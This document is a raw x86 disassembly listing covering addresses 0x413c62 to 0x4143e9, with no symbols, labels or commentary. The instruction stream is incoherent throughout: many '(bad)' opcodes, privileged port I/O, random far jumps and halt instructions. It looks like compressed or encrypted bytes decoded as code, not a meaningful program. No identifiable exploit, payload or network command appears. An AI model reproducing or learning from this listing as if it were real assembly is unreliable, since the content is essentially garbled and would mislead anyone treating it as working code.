  413c62:	sbb    al,0x31
  413c64:	mul    BYTE PTR [eax-0x5e]
  413c67:	pop    esi
  413c68:	in     eax,0x17
  413c6a:	es cwde 
  413c6c:	sub    esp,esi
  413c6e:	sub    bh,BYTE PTR [esi-0x4a]
  413c71:	inc    ecx
  413c72:	jnp    0x413c33
  413c74:	fwait
  413c75:	in     eax,dx
  413c76:	repnz out dx,eax
  413c78:	push   eax
  413c79:	xor    bl,ch
  413c7b:	add    al,0xd8
  413c7d:	imul   ebx,DWORD PTR [ebx+0x4a],0x2b
  413c81:	dec    ebp
  413c82:	out    dx,eax
  413c83:	lea    ebx,[edx-0x7ea63b95]
  413c89:	(bad)  
  413c8a:	push   esp
  413c8b:	mov    eax,0x983554c8
  413c90:	fisttp WORD PTR [ecx]
  413c92:	jnp    0x413c7e
  413c94:	cld    
  413c95:	push   ss
  413c96:	repz cmp al,ah
  413c99:	sbb    ch,BYTE PTR ds:0xcc9a1781
  413c9f:	int3   
  413ca0:	ins    DWORD PTR es:[edi],dx
  413ca1:	fcom   QWORD PTR ds:[ebp-0x42]
  413ca5:	dec    ebx
  413ca6:	in     eax,0x68
  413ca8:	shr    BYTE PTR [edx-0x7d],1
  413cab:	scas   al,BYTE PTR es:[edi]
  413cac:	push   esi
  413cad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cae:	mov    WORD PTR [eax-0x4756739c],ds
  413cb4:	or     bh,ah
  413cb6:	es xor al,0x15
  413cb9:	rcr    DWORD PTR [esi-0x5f],1
  413cbc:	cmp    BYTE PTR [edi],dh
  413cbe:	sub    eax,0x9cd84e23
  413cc3:	aaa    
  413cc4:	jmp    0x413d3d
  413cc6:	mov    ds:0xe30c1997,al
  413ccb:	pushf  
  413ccc:	mov    ah,0xf
  413cce:	xor    edx,DWORD PTR [edx-0x2cec1404]
  413cd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cd5:	xchg   edi,eax
  413cd6:	nop
  413cd7:	push   ebx
  413cd8:	imul   edi,DWORD PTR [ebx],0x44788948
  413cde:	(bad)  
  413ce0:	hlt    
  413ce1:	xor    esi,DWORD PTR [esi-0x39068e]
  413ce7:	imul   ebx,esi,0xd13498a3
  413ced:	jge    0x413cc3
  413cef:	inc    esp
  413cf0:	loop   0x413c8f
  413cf2:	mov    ds:0x6acf8c35,eax
  413cf7:	loope  0x413cb0
  413cf9:	jbe    0x413cce
  413cfb:	xor    ch,BYTE PTR [esi+0x76]
  413cfe:	retf   0xe189
  413d01:	scas   eax,DWORD PTR es:[edi]
  413d02:	mov    ebp,0x6b61699a
  413d07:	pop    ebx
  413d08:	xchg   ecx,eax
  413d09:	mov    esi,?
  413d0b:	aaa    
  413d0c:	ret    
  413d0d:	push   ecx
  413d0e:	sbb    DWORD PTR [ebx+0x427e14d5],esi
  413d14:	in     al,dx
  413d15:	cmp    DWORD PTR [edx+0x6756a909],eax
  413d1b:	mov    ch,0xfe
  413d1d:	stos   DWORD PTR es:[edi],eax
  413d1e:	mov    dl,0xa3
  413d20:	not    edx
  413d22:	sbb    eax,0x992e210a
  413d27:	add    al,BYTE PTR [edi-0x488f9118]
  413d2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d2e:	sub    BYTE PTR [ecx+0x4eef14b2],0xea
  413d35:	and    BYTE PTR [edi],cl
  413d37:	inc    ebp
  413d38:	dec    ebp
  413d39:	sti    
  413d3a:	push   ecx
  413d3b:	(bad)  
  413d3d:	test   DWORD PTR [ebx-0x4e332559],edx
  413d43:	in     al,0xe7
  413d45:	mov    esp,ss
  413d47:	cmp    eax,DWORD PTR [edx+eiz*1]
  413d4a:	ffreep st(3)
  413d4c:	imul   edi,DWORD PTR [ecx+0x2a],0x4a
  413d50:	(bad)  
  413d51:	rol    ecx,1
  413d53:	in     al,dx
  413d54:	gs test eax,0xcbdf2193
  413d5a:	(bad)  
  413d5b:	xor    bl,ah
  413d5d:	push   edx
  413d5e:	imul   ebx,DWORD PTR [ebx+0x68],0xfffffffe
  413d62:	test   BYTE PTR [ecx+0x1cc3f8f],ch
  413d68:	mov    bh,0x25
  413d6a:	add    dh,BYTE PTR [eax-0x2c0e5ff0]
  413d70:	hlt    
  413d71:	and    esp,eax
  413d73:	and    DWORD PTR [eax+0x1],edx
  413d76:	mov    edx,0xdee65029
  413d7b:	add    eax,0x9526d6e7
  413d80:	out    0xd9,eax
  413d82:	and    ecx,DWORD PTR [edi-0x5fd90071]
  413d88:	pushf  
  413d89:	mov    bh,0x93
  413d8b:	jbe    0x413dda
  413d8d:	inc    ebx
  413d8e:	cmp    BYTE PTR [esi+ebp*1-0x76cb16f5],cl
  413d95:	lahf   
  413d96:	mov    bl,0xe3
  413d98:	stc    
  413d99:	jg     0x413d75
  413d9b:	stc    
  413d9c:	mov    eax,ds:0x3fd16ec0
  413da1:	fnsave [edi+0x15be2bf0]
  413da7:	sub    dh,ch
  413da9:	ds imul esp,ebx,0x49
  413dad:	xchg   edx,eax
  413dae:	mov    ah,0x50
  413db0:	dec    edx
  413db1:	mov    dh,0x52
  413db3:	mov    edi,DWORD PTR [edx-0x127a4e90]
  413db9:	jl     0x413d7b
  413dbb:	loopne 0x413d43
  413dbd:	ins    BYTE PTR es:[edi],dx
  413dbe:	int    0xfb
  413dc0:	es hlt 
  413dc2:	mov    cl,0xae
  413dc4:	push   ecx
  413dc5:	and    edi,DWORD PTR [esi+0x25]
  413dc8:	cdq    
  413dc9:	or     DWORD PTR [eax],edi
  413dcb:	sar    dh,0x22
  413dce:	gs jbe 0x413e0d
  413dd1:	push   ebp
  413dd2:	adc    ch,BYTE PTR [edi]
  413dd4:	repz imul edi,eax,0xbe2f8fa9
  413ddb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ddc:	push   edx
  413ddd:	stos   BYTE PTR es:[edi],al
  413dde:	and    BYTE PTR [edi+0x19aa8693],dl
  413de4:	cmp    DWORD PTR [ebx],ebp
  413de6:	jp     0x413ddd
  413de8:	xchg   BYTE PTR [ecx],ch
  413dea:	ret    0xafcb
  413ded:	sub    DWORD PTR [eax+0x4d],ebx
  413df0:	mov    ?,WORD PTR [ebx+0x727937d4]
  413df6:	mov    eax,0xbab47a8f
  413dfb:	mov    ebp,0x3b17cdfa
  413e00:	lods   eax,DWORD PTR ds:[esi]
  413e01:	add    eax,0xdce66f1
  413e06:	jg     0x413dc0
  413e08:	jno    0x413dd7
  413e0a:	stos   BYTE PTR es:[edi],al
  413e0b:	out    0x5e,al
  413e0d:	xchg   BYTE PTR [ebx],bl
  413e0f:	pop    edx
  413e10:	adc    ebx,esi
  413e12:	pop    ds
  413e13:	sub    eax,DWORD PTR [ecx]
  413e15:	xor    esp,DWORD PTR [eax+0x28c3ee31]
  413e1b:	cdq    
  413e1c:	or     DWORD PTR [ebp+0x56af246d],ecx
  413e22:	out    dx,al
  413e23:	jnp    0x413e45
  413e25:	dec    ecx
  413e26:	dec    edi
  413e27:	xchg   esi,edx
  413e29:	or     al,0x67
  413e2b:	or     BYTE PTR [eax+ebx*2-0x3f],ah
  413e2f:	inc    ebx
  413e30:	test   esp,esi
  413e32:	add    DWORD PTR [edi+0x7dd578a7],ebp
  413e38:	imul   eax,DWORD PTR [eax-0x4e9c410c],0xac348b7
  413e42:	jmp    0x413e70
  413e44:	sar    DWORD PTR [esi+0x6f8ef042],1
  413e4a:	fidiv  WORD PTR [edx+edi*1+0x1245e515]
  413e51:	cmp    BYTE PTR [eax+0x5f],bl
  413e54:	fisubr WORD PTR [edx]
  413e56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e57:	jno    0x413e0e
  413e59:	out    0xe8,al
  413e5b:	and    eax,0x2e14a60f
  413e60:	test   BYTE PTR [esi],cl
  413e62:	push   ecx
  413e63:	hlt    
  413e64:	jp     0x413e1e
  413e66:	inc    esp
  413e67:	shl    DWORD PTR [ebp-0x677935df],0x85
  413e6e:	mul    DWORD PTR [edx-0x443dfa76]
  413e74:	xchg   DWORD PTR [ecx-0x5f3b7798],esp
  413e7a:	inc    esi
  413e7b:	mov    ebx,0x8ee5296e
  413e80:	(bad)  
  413e81:	ss mov bh,0xfb
  413e84:	outs   dx,BYTE PTR ds:[esi]
  413e85:	lods   al,BYTE PTR ds:[esi]
  413e86:	mov    edi,0x5e91bd52
  413e8b:	push   esi
  413e8c:	(bad)  
  413e8d:	cmp    ah,BYTE PTR [ebx+0x17b1130]
  413e93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e94:	retf   0x90d4
  413e97:	adc    DWORD PTR [esi-0x15],0xffffff8a
  413e9b:	jmp    0x5a07c879
  413ea0:	in     eax,dx
  413ea1:	jl     0x413e84
  413ea3:	adc    al,0x87
  413ea5:	xchg   edi,eax
  413ea6:	xor    bl,dh
  413ea8:	fdivr  st,st(4)
  413eaa:	bnd jmp 0x413ef2
  413ead:	and    ch,cl
  413eaf:	(bad)  
  413eb0:	gs sub bh,ch
  413eb3:	mov    dh,0x3
  413eb5:	sub    al,0xe0
  413eb7:	mov    al,ds:0xa2be5c8a
  413ebc:	les    ecx,FWORD PTR [ebp+0x6b1ff53d]
  413ec2:	call   0xf10537b6
  413ec7:	sub    edx,DWORD PTR [esi]
  413ec9:	xor    dl,BYTE PTR [edx+eiz*8+0x2946d6a8]
  413ed0:	jmp    DWORD PTR [edx-0x7f]
  413ed3:	lahf   
  413ed4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ed5:	rcr    cl,0xb1
  413ed8:	xchg   ebp,eax
  413ed9:	int3   
  413eda:	rcl    BYTE PTR [edi+0xad27bbb],cl
  413ee0:	sbb    eax,0x519acaa8
  413ee5:	pop    ds
  413ee6:	in     eax,dx
  413ee7:	and    eax,0xf04be953
  413eec:	mov    BYTE PTR [edi+eiz*8+0x53e238b1],cl
  413ef3:	popf   
  413ef4:	inc    eax
  413ef5:	into   
  413ef6:	jo     0x413eb6
  413ef8:	fs push ecx
  413efa:	addr16 push esp
  413efc:	lahf   
  413efd:	cld    
  413efe:	mov    eax,0x1bf0e5e0
  413f03:	pop    ds
  413f04:	cmp    BYTE PTR ds:0x546c07f5,bl
  413f0a:	mov    cl,0xe0
  413f0c:	sub    bh,dl
  413f0e:	mov    BYTE PTR [esi+0x45],bl
  413f11:	sar    BYTE PTR [ecx-0x4d8d2eed],cl
  413f17:	push   0xffffffb5
  413f19:	cmp    eax,DWORD PTR [esi+0x66]
  413f1c:	fld    DWORD PTR [edi+esi*1-0x52]
  413f20:	sti    
  413f21:	and    al,0x0
  413f23:	icebp  
  413f24:	into   
  413f25:	cld    
  413f26:	cmp    eax,0x444055a5
  413f2b:	mov    ecx,0x86c2fd20
  413f30:	add    al,0x86
  413f32:	fld    DWORD PTR [edi+0x610f5361]
  413f38:	(bad)  [ebp-0xb]
  413f3b:	pop    esp
  413f3c:	xchg   ebx,eax
  413f3d:	jmp    0x51d6:0x378ce53c
  413f44:	sub    ecx,esi
  413f46:	aam    0x14
  413f48:	mov    ds:0x1e94c23e,eax
  413f4d:	in     eax,0xb3
  413f4f:	ds mov bl,0x9e
  413f52:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  413f54:	fisttp QWORD PTR [ebx]
  413f56:	dec    esi
  413f57:	(bad)  
  413f58:	aad    0x9e
  413f5a:	rcr    BYTE PTR [ebp+0x70cf7cc4],0x61
  413f61:	js     0x413f06
  413f63:	sar    BYTE PTR [ebp+0x414cef96],0xf1
  413f6a:	out    dx,al
  413f6b:	inc    ebp
  413f6c:	jge    0x413fd2
  413f6e:	jge    0x413f41
  413f70:	ss loope 0x413fb4
  413f73:	daa    
  413f74:	retf   0x2592
  413f77:	add    dh,BYTE PTR [ecx]
  413f79:	jns    0x413fd8
  413f7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f7c:	out    0xaa,eax
  413f7e:	add    bh,al
  413f80:	and    BYTE PTR [ecx+0xe],cl
  413f83:	mov    edx,DWORD PTR [esi+0x16]
  413f86:	(bad)  
  413f87:	js     0x413f67
  413f89:	pushf  
  413f8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f8b:	in     eax,dx
  413f8c:	aad    0xf6
  413f8e:	mov    dl,0x5
  413f90:	lods   eax,DWORD PTR ds:[esi]
  413f91:	mov    edx,DWORD PTR ds:0x460e0065
  413f97:	or     al,BYTE PTR [ebp+0x31]
  413f9a:	jmp    0x413f6b
  413f9c:	rcl    edi,cl
  413f9e:	ret    0x3223
  413fa1:	gs xchg esp,eax
  413fa3:	cmp    ch,BYTE PTR [ecx+ebp*4]
  413fa6:	shr    BYTE PTR [ebx-0x2d],1
  413fa9:	jo     0x413f59
  413fab:	sbb    ebx,ebp
  413fad:	jle    0x413f5d
  413faf:	pusha  
  413fb0:	aas    
  413fb1:	int3   
  413fb2:	fmul   QWORD PTR [ecx+0x5b]
  413fb6:	fimul  WORD PTR [ebp-0x4b]
  413fb9:	call   0xeb3b:0x1533956f
  413fc0:	xchg   edx,eax
  413fc1:	xchg   esi,eax
  413fc2:	dec    eax
  413fc3:	jmp    0x413f68
  413fc5:	(bad)  
  413fc6:	imul   eax,DWORD PTR [ebx],0x92d2c753
  413fcc:	stos   DWORD PTR es:[edi],eax
  413fcd:	mov    ah,BYTE PTR [edi-0x27]
  413fd0:	push   0x5b262b95
  413fd5:	inc    ebx
  413fd6:	pop    edi
  413fd7:	dec    esp
  413fd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fd9:	repz adc ebp,esp
  413fdc:	int3   
  413fdd:	dec    edx
  413fde:	les    edi,FWORD PTR [edi-0x21]
  413fe1:	mov    ds,WORD PTR [ecx-0x19]
  413fe4:	cld    
  413fe5:	sub    bh,al
  413fe7:	inc    ebp
  413fe8:	out    0x8a,eax
  413fea:	xchg   esi,eax
  413feb:	xor    DWORD PTR [esi-0x44406476],edi
  413ff1:	mov    ebp,0x989c6734
  413ff6:	shrd   DWORD PTR [esi-0x12b37273],ecx,cl
  413ffd:	test   BYTE PTR [edi+0xf6db2e0],ch
  414003:	sub    al,0x7b
  414005:	je     0x414068
  414007:	mov    eax,0x9aaa2e32
  41400c:	out    0x34,al
  41400e:	xchg   edi,eax
  41400f:	sbb    al,al
  414011:	fwait
  414012:	cwde   
  414013:	mov    eax,ds:0x58a8d6a3
  414018:	iret   
  414019:	xor    BYTE PTR [eax],ch
  41401b:	arpl   WORD PTR [ebx-0x744c83de],ax
  414021:	jle    0x414008
  414023:	jmp    0x8099:0xdaa04fc6
  41402a:	shl    DWORD PTR [ecx-0x23],0xac
  41402e:	dec    eax
  41402f:	add    DWORD PTR [ecx+0x8375fbc],eax
  414035:	pop    ebx
  414036:	loopne 0x414033
  414038:	adc    ch,bl
  41403a:	je     0x4140ba
  41403c:	mov    bl,0xa4
  41403e:	cmp    al,0x72
  414040:	ror    BYTE PTR [esi-0x667105f6],cl
  414046:	jmp    0x414080
  414048:	bound  esp,QWORD PTR [ecx]
  41404a:	mov    BYTE PTR [eax+eiz*2-0x6e],0x26
  41404f:	mov    ebx,0xf532d148
  414054:	cmp    eax,0x9d5ee880
  414059:	dec    ebp
  41405a:	scas   al,BYTE PTR es:[edi]
  41405b:	popa   
  41405c:	rcl    DWORD PTR [edi-0x504303d],1
  414062:	cs add al,0xba
  414065:	mov    ds:0x2595da46,al
  41406a:	sbb    esp,DWORD PTR [ecx-0x24]
  41406d:	or     eax,ecx
  41406f:	or     BYTE PTR [eax+0x1719d2c],ch
  414075:	xchg   ecx,eax
  414076:	clc    
  414077:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414078:	lods   eax,DWORD PTR ds:[esi]
  414079:	pop    esi
  41407a:	adc    DWORD PTR [eax-0x61],0x6b
  41407e:	and    DWORD PTR [edi+0x48],esi
  414081:	adc    BYTE PTR [ecx],0xd2
  414084:	pop    eax
  414085:	xchg   ebp,eax
  414086:	add    eax,0x2fe99be1
  41408b:	fcomp  QWORD PTR [esi]
  41408d:	aad    0xc8
  41408f:	aaa    
  414090:	and    eax,0x363e3142
  414095:	jb     0x41408d
  414097:	dec    esi
  414098:	lods   eax,DWORD PTR ds:[esi]
  414099:	cmp    ah,ah
  41409b:	(bad)  
  41409c:	xchg   esp,eax
  41409d:	lds    esp,FWORD PTR [ebp+0x7d]
  4140a0:	bound  eax,QWORD PTR [edx+0x5a]
  4140a3:	mov    bh,0x52
  4140a5:	xchg   ebx,eax
  4140a6:	and    DWORD PTR [esi-0x4698d93a],eax
  4140ac:	mov    dl,0x7f
  4140ae:	jnp    0x41408c
  4140b0:	in     al,dx
  4140b1:	pop    edi
  4140b2:	and    BYTE PTR [ebx-0x48],0x13
  4140b6:	(bad)  
  4140b7:	or     ecx,esp
  4140b9:	mov    ah,0x1
  4140bb:	ins    DWORD PTR es:[edi],dx
  4140bc:	xchg   esi,eax
  4140bd:	jns    0x414086
  4140bf:	(bad)  
  4140c0:	fnstsw ax
  4140c2:	int    0xda
  4140c4:	pop    ss
  4140c5:	rcr    DWORD PTR [ecx-0x3721f81b],0xc0
  4140cc:	jne    0x414056
  4140ce:	mov    bl,0x4e
  4140d0:	xor    al,0xc0
  4140d2:	xor    al,0x54
  4140d4:	inc    ebx
  4140d5:	lods   eax,DWORD PTR ds:[esi]
  4140d6:	das    
  4140d7:	in     al,dx
  4140d8:	mov    ds:0x9e23b0af,al
  4140dd:	(bad)  
  4140de:	pop    ebp
  4140df:	add    DWORD PTR [esi],esi
  4140e1:	cmp    al,0xf0
  4140e3:	fmul   DWORD PTR [eax]
  4140e5:	fbld   TBYTE PTR [ecx+0x6e]
  4140e8:	jp     0x41407d
  4140ea:	pushf  
  4140eb:	stos   DWORD PTR es:[edi],eax
  4140ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140ed:	jge    0x4140d3
  4140ef:	aas    
  4140f0:	xchg   esi,eax
  4140f1:	leave  
  4140f2:	lock mov ebp,0xadb4730d
  4140f8:	fwait
  4140f9:	lds    ebx,FWORD PTR [ebx]
  4140fb:	stos   BYTE PTR es:[edi],al
  4140fc:	(bad)  
  4140fd:	retf   
  4140fe:	adc    eax,0x474b0899
  414103:	(bad)  
  414105:	xchg   DWORD PTR [ecx-0x1f],ebp
  414108:	push   cs
  414109:	ss repnz (bad) 
  41410c:	cmp    al,0x23
  41410e:	sub    cl,dl
  414110:	sub    BYTE PTR [ecx],al
  414112:	rcr    BYTE PTR [bx+si],0x56
  414116:	inc    ebx
  414117:	retf   
  414118:	push   esi
  414119:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41411a:	xor    BYTE PTR [ebx-0x2ae19945],ah
  414120:	cli    
  414121:	popa   
  414122:	sub    esi,DWORD PTR [ebx]
  414124:	clc    
  414125:	fld    DWORD PTR [ebp+0x6]
  414128:	loope  0x414110
  41412a:	in     al,0xcc
  41412c:	jmp    0x4140be
  41412e:	sbb    DWORD PTR [ecx-0x7aff8ae7],eax
  414134:	xor    BYTE PTR [edx-0x54],0xc8
  414138:	cmp    ch,BYTE PTR [ebx-0x4]
  41413b:	mov    al,0x24
  41413d:	xchg   esi,eax
  41413e:	xor    DWORD PTR [esi-0x4f806494],ebx
  414144:	mov    BYTE PTR [edi+0x54],dh
  414147:	xlat   BYTE PTR ds:[ebx]
  414148:	outs   dx,BYTE PTR ds:[esi]
  414149:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41414a:	ror    DWORD PTR [ebp+0x1ca0308a],0xab
  414151:	es push ecx
  414153:	jg     0x414143
  414155:	pop    ebx
  414156:	and    eax,DWORD PTR [ebx]
  414158:	out    dx,al
  414159:	test   DWORD PTR [edi+0x71],esi
  41415c:	sub    eax,0xb7122643
  414161:	fisub  DWORD PTR [ebx-0x4f1fa1ea]
  414167:	xchg   ebp,eax
  414169:	lods   al,BYTE PTR ds:[esi]
  41416a:	test   BYTE PTR [ecx+0x76],cl
  41416d:	div    ch
  41416f:	std    
  414170:	out    0x26,eax
  414172:	repz int3 
  414174:	es mov edx,0xef7ead6b
  41417a:	(bad)  
  41417b:	cdq    
  41417c:	dec    eax
  41417d:	sub    al,0x1d
  41417f:	push   es
  414180:	loop   0x414148
  414182:	lea    eax,[ebx+0x60ca9702]
  414188:	inc    esp
  414189:	dec    edx
  41418a:	int3   
  41418b:	(bad)  
  41418c:	xchg   edi,eax
  41418d:	add    esp,DWORD PTR [edi-0x4a3dc822]
  414193:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414194:	test   eax,0xbdac2ec0
  414199:	sti    
  41419a:	push   ss
  41419b:	hlt    
  41419c:	shr    DWORD PTR [eax],1
  41419e:	stc    
  41419f:	clc    
  4141a0:	cmc    
  4141a1:	aam    0xd2
  4141a3:	mov    ah,0xd9
  4141a5:	dec    esi
  4141a6:	mov    ch,0xb8
  4141a8:	sub    BYTE PTR [esi+0x66],0x6c
  4141ac:	cwde   
  4141ad:	popf   
  4141ae:	mov    al,0x25
  4141b0:	dec    esi
  4141b1:	ins    DWORD PTR es:[edi],dx
  4141b2:	les    edx,FWORD PTR [ebp-0x95a3bd5]
  4141b8:	adc    al,0x66
  4141ba:	mov    ds:0x33322b20,eax
  4141bf:	sbb    eax,0x974402f1
  4141c4:	in     al,0xe1
  4141c6:	test   eax,0x55a45720
  4141cb:	cmp    al,al
  4141cd:	or     ebp,DWORD PTR fs:[edi-0x13]
  4141d1:	push   ds
  4141d2:	out    0x9d,eax
  4141d4:	inc    ebp
  4141d5:	push   esp
  4141d6:	stos   BYTE PTR es:[edi],al
  4141d7:	arpl   si,bx
  4141d9:	add    al,0x58
  4141db:	fbld   TBYTE PTR [eax-0x6b3a25e5]
  4141e1:	js     0x4141a0
  4141e3:	sahf   
  4141e4:	xor    BYTE PTR [ebx-0x63],dl
  4141e7:	lock pop edi
  4141e9:	push   ds
  4141ea:	stc    
  4141eb:	pusha  
  4141ec:	es jns 0x414173
  4141ef:	gs scas al,BYTE PTR es:[edi]
  4141f1:	enter  0x6f84,0x1b
  4141f5:	xor    BYTE PTR [edx-0x36],0xfc
  4141f9:	div    bl
  4141fb:	add    DWORD PTR [eax-0x37aab356],0x7e5e25a6
  414205:	xor    DWORD PTR [ebp-0x5632cd7f],0x63
  41420c:	mov    esi,0xbc27c3e0
  414211:	xor    DWORD PTR ds:0x54a052d6,ebx
  414217:	adc    DWORD PTR [esi],ecx
  414219:	pop    eax
  41421a:	ret    0x8de9
  41421d:	xchg   BYTE PTR [ebp+0x1fdb0de1],ah
  414223:	imul   esp,DWORD PTR [ebx+0x32aeb3e1],0x4f
  41422a:	pushf  
  41422b:	and    DWORD PTR [edi-0x32f9daed],edi
  414231:	xchg   esp,eax
  414232:	sbb    esp,DWORD PTR [eax+0x2fb51514]
  414238:	mov    DWORD PTR [ecx-0x52d0f8e8],ebx
  41423e:	cmc    
  41423f:	dec    edx
  414240:	jge    0x41427e
  414242:	sbb    eax,0xb981533e
  414247:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414248:	ds (bad) 
  41424a:	xor    ebp,DWORD PTR [edi+0x6b]
  41424d:	dec    eax
  41424e:	cli    
  41424f:	xchg   ecx,eax
  414250:	inc    esi
  414251:	icebp  
  414252:	fxam   
  414254:	loop   0x4141ee
  414256:	(bad)  
  414257:	sbb    DWORD PTR [eax+ebx*1],ebx
  41425a:	mov    ah,0xa4
  41425c:	push   eax
  41425d:	cs add al,0x87
  414260:	cs dec ebx
  414262:	repz sbb cl,BYTE PTR [edi-0x23ce2eb4]
  414269:	pushf  
  41426a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41426b:	stos   DWORD PTR es:[edi],eax
  41426c:	scas   al,BYTE PTR es:[edi]
  41426d:	push   ss
  41426e:	ins    DWORD PTR es:[edi],dx
  41426f:	xor    BYTE PTR [ecx-0x64],al
  414272:	dec    edi
  414273:	les    esp,FWORD PTR [eax+0x5ad00f3d]
  414279:	mov    al,0x18
  41427b:	retf   0xf4f6
  41427e:	sub    ebp,esi
  414280:	les    ebp,FWORD PTR [edx+0x7c]
  414283:	jmp    0x4142e3
  414285:	fdiv   QWORD PTR [edx]
  414287:	retf   
  414288:	mov    ebp,0xa3ced3cf
  41428d:	sbb    BYTE PTR [eax-0x3],cl
  414290:	pop    edi
  414291:	pop    edi
  414292:	cdq    
  414293:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414294:	mov    esp,0xdfca69bd
  414299:	ins    BYTE PTR es:[edi],dx
  41429a:	(bad)  
  41429c:	fist   DWORD PTR [edi]
  41429e:	aam    0xe1
  4142a0:	cmp    al,0xef
  4142a2:	leave  
  4142a3:	repnz add eax,0x8828963
  4142a9:	mov    bp,0x1943
  4142ad:	jge    0x4142e6
  4142af:	push   cs
  4142b0:	sub    al,0x1d
  4142b2:	icebp  
  4142b3:	or     dl,bl
  4142b5:	mov    ds:0x179bb989,al
  4142ba:	inc    esi
  4142bb:	cmc    
  4142bc:	fimul  DWORD PTR [esi-0x7bd1c7ba]
  4142c2:	ds jns 0x4142a3
  4142c5:	aas    
  4142c6:	fwait
  4142c7:	aas    
  4142c8:	test   eax,0x867cad3a
  4142cd:	inc    esi
  4142ce:	cli    
  4142cf:	scas   eax,DWORD PTR es:[edi]
  4142d0:	ret    
  4142d1:	pop    es
  4142d2:	pusha  
  4142d3:	jmp    0xfaa94ddb
  4142d8:	lahf   
  4142d9:	xor    dl,BYTE PTR [ecx+ecx*1]
  4142dc:	or     edx,DWORD PTR [eax+0x49]
  4142df:	in     al,dx
  4142e0:	jle    0x4142b0
  4142e2:	dec    edx
  4142e3:	add    al,0x50
  4142e5:	push   ecx
  4142e6:	jg     0x4142f6
  4142e8:	dec    eax
  4142e9:	imul   esi,DWORD PTR [ecx-0x65d2758d],0x72
  4142f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142f1:	int3   
  4142f2:	mov    dl,0x11
  4142f4:	ja     0x4142dc
  4142f6:	push   ss
  4142f7:	clc    
  4142f8:	std    
  4142f9:	rol    BYTE PTR [ebx+0x5eabaf71],1
  4142ff:	xchg   esi,eax
  414300:	jnp    0x41430a
  414302:	aam    0x6b
  414304:	test   DWORD PTR [ebx-0x33],esi
  414307:	test   DWORD PTR [ecx-0x1b0b924f],esp
  41430d:	jo     0x414333
  41430f:	dec    ecx
  414310:	fdivr  QWORD PTR [eax+0x796f0c55]
  414316:	int3   
  414317:	sbb    DWORD PTR [edx+0x33604898],ebp
  41431d:	mov    ch,0x6e
  41431f:	cmp    BYTE PTR [ebx-0x40],dh
  414322:	mov    BYTE PTR ds:0x2738c678,ch
  414328:	test   eax,0x63bd9daf
  41432d:	mov    eax,ds:0x4c069475
  414332:	sub    eax,0x3af55677
  414337:	add    ch,bh
  414339:	push   ecx
  41433a:	fistp  WORD PTR [eax-0x7f4daf6e]
  414340:	sub    bh,BYTE PTR [edx-0x725057c1]
  414346:	into   
  414347:	and    ah,BYTE PTR [edi]
  414349:	inc    esp
  41434a:	and    BYTE PTR [edi-0xbb93d81],ch
  414350:	lea    eax,[eax+eiz*2+0x4c]
  414354:	stc    
  414355:	and    al,0x80
  414357:	daa    
  414358:	inc    eax
  414359:	mov    esp,DWORD PTR [esi-0xb080429]
  41435f:	sub    edx,edx
  414361:	aaa    
  414362:	leave  
  414363:	nop
  414364:	push   es
  414365:	mov    al,0xf0
  414367:	leave  
  414368:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414369:	add    al,0x4a
  41436b:	sub    esi,DWORD PTR [ecx+0x27]
  41436e:	retf   
  41436f:	fdiv   QWORD PTR [edx-0x4e]
  414372:	ins    DWORD PTR es:[edi],dx
  414373:	push   ebx
  414374:	pop    ebp
  414375:	test   BYTE PTR [eax+0x2febf323],ch
  41437b:	out    dx,al
  41437c:	cmp    BYTE PTR [ebx],al
  41437e:	xor    BYTE PTR [eax],dh
  414380:	push   ebx
  414381:	test   DWORD PTR [edx],eax
  414383:	add    eax,0x683d91c1
  414388:	ffree  st(0)
  41438a:	(bad)  
  41438b:	std    
  41438c:	int    0x2d
  41438e:	cmp    BYTE PTR [edx+esi*4-0x12038656],dh
  414395:	scas   eax,DWORD PTR es:[edi]
  414396:	mov    BYTE PTR [ebp+0x1],ah
  414399:	fsub   QWORD PTR [edi]
  41439b:	sbb    edx,DWORD PTR [eax]
  41439d:	pop    ecx
  41439e:	mov    eax,esi
  4143a0:	jae    0x4143e9
  4143a2:	sub    al,0xbe
  4143a4:	repz hlt 
  4143a6:	frstor [ecx+0x4f]
  4143a9:	pop    edi
  4143aa:	add    edx,DWORD PTR [ecx]
  4143ac:	jmp    0x41433b
  4143ae:	mov    ebp,ds
  4143b0:	or     DWORD PTR [edx+0x68b393d7],edi
  4143b6:	scas   eax,DWORD PTR es:[edi]
  4143b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143b8:	test   eax,eax
  4143ba:	cmp    DWORD PTR [ecx],eax
  4143bc:	xlat   BYTE PTR ds:[ebx]
  4143bd:	in     eax,0xa1
  4143bf:	lea    esi,[ecx]
  4143c1:	and    dh,BYTE PTR gs:[esi-0x418fa247]
  4143c8:	push   ss
  4143c9:	pusha  
  4143ca:	mov    edi,0xa9ff1680
  4143cf:	in     eax,dx
  4143d0:	push   ebp
  4143d1:	arpl   WORD PTR [edx-0x332febcb],ax
  4143d7:	in     al,dx
  4143d8:	cmp    BYTE PTR [ebx+0x62433530],al
  4143de:	pop    eax
  4143df:	aaa    
  4143e0:	xor    eax,0x1f962d5b
  4143e5:	jecxz  0x4143d9
  4143e7:	xor    DWORD PTR [edx],edx
  4143e9:	and    BYTE PTR [ebx],dh
